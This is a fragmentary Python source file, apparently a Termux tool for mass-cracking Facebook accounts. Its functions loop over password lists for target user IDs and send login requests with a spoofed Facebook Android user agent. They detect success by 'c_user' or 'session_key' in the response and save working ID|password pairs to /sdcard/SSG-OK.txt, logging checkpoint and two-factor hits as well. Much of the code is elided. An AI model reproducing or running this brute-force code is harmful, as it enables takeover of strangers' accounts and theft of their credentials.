...
----------------------------------------------
 Author    : SSG
 ☞︎︎︎➪𓅓[🌻owner creator: 𓆩Zeshu𓆪🌻𓆩𓆪𓅓☜︎︎︎✍︎     
\033[1;32m\033[1;37m☞  𓆩Zeshu𓆪\x1b[38;5;208mAUTHER     \033[1;37m➣   \x1b[38;5;205/ & 
----------------------------------------------
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://https://www.facebook.com/ZeshanBAloch.5678&mibextid=ZbWKwL');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://https://www.facebook.com/huney.gul?mibextid=ZbWKwL/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ZESHU-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SSG:
                                print('\r\r\033[1;32m [Zeshu-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SSG-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SSG:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Zeshu-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/'+fbbv+';FBCR/null;FBMF/samsung;FBBD/'+fbbd+';FBDV/SM-G532G;FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/'+str(random.randint(111111111,999999999))+';]'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Zeshu-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SSG-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Zeshu-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Zeshu-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Zeshu-CP] '+str(uid)+' | '+pas+'\033[1;97m')
